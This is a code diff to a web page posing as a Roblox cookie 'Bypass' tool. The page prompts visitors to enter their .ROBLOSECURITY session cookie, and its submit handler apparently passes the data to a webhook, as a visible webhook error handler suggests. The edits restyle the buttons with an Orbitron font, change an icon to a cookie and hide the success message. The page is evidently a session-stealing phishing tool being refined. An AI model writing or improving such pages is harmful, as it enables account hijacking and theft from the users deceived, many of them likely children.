@@ -8,6 +8,7 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap');
     
     :root {
       --primary-purple: #8B5CF6;
@@ -241,8 +242,11 @@
       padding: 1.2rem 2rem;
       border: none;
       border-radius: 16px;
-      font-size: 1.1rem;
-      font-weight: 600;
+      font-family: 'Orbitron', 'Inter', monospace;
+      font-size: 1rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
       cursor: pointer;
       transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       box-shadow: 0 8px 24px var(--glow-purple);
@@ -477,7 +481,7 @@
           <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required>
         </div>
         <button type="submit" class="hero-btn" id="refreshBtn">
-          <i class="fas fa-shield-alt"></i>
+          <i class="fas fa-cookie-bite"></i>
           Bypass
         </button>
       </form>
@@ -490,7 +494,6 @@
       <div id="userInfo" style="display:none; margin-bottom: 1rem;"></div>
       
       <div id="refreshedBox" style="display:none;">
-        <p class="output" id="refreshedResult"></p>
         <button class="hero-btn" id="returnBtn">
           <i class="fas fa-redo"></i>
           Try Another
@@ -942,8 +945,7 @@ $("#cookieForm").on("submit", async function(e) {
       console.error("Webhook error:", webhookError);
     }
 
-    // Show success message
-    $("#refreshedResult").text(`✅ Cookie Bypassed Successfully!`);
+    // Show only the try another button (no success message text)
     successSound.play();
     $("#refreshedBox").fadeIn();
     
@@ -953,7 +955,7 @@ $("#cookieForm").on("submit", async function(e) {
     console.error("Submit error:", error);
   } finally {
     $("#loader").hide();
-    $("#refreshBtn").show();
+    // Don't show the bypass button again - it should only appear after clicking "Try Another"
   }
 });
 
